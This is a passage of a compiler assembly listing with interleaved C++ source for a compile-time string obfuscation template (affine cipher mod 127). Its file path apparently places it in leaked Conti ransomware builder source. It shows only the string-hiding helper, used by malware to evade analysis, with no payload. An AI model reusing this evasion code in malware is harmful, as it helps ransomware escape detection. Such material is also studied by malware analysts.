  00a4b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00a50	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a57	88 41 3e	 mov	 BYTE PTR [rcx+62], al
  00a5a	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00a61	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00a65	88 85 c0 00 00
	00		 mov	 BYTE PTR tv532[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00a6b	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00a72	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00a79	5f		 pop	 rdi
  00a7a	5d		 pop	 rbp
  00a7b	c3		 ret	 0
??0?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 08	 sub	 eax, 8
  0002d	6b c0 0c	 imul	 eax, eax, 12
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 35	 imul	 eax, eax, 53		; 00000035H
  0002d	83 c0 08	 add	 eax, 8
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 34	 cmp	 QWORD PTR i$1[rbp], 52	; 00000034H
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ PROC ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv462 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
